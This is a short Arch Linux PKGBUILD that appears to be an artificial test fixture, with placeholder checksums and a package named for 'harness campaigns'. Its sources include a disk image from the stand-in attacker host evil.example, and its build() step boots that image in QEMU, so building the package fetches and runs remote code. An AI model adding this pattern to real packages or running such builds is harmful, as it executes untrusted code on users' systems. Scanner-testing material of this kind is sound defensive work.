pkgname=harness-baseline
pkgver=1.0.0
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=('any')
url="https://github.com/example/harness-baseline"
license=('MIT')
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
        "https://evil.example/vm.qcow2")
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
            '1111111111111111111111111111111111111111111111111111111111111111')

build() {
  qemu-system-x86_64 -nographic -drive file="$srcdir/vm.qcow2",format=qcow2
}
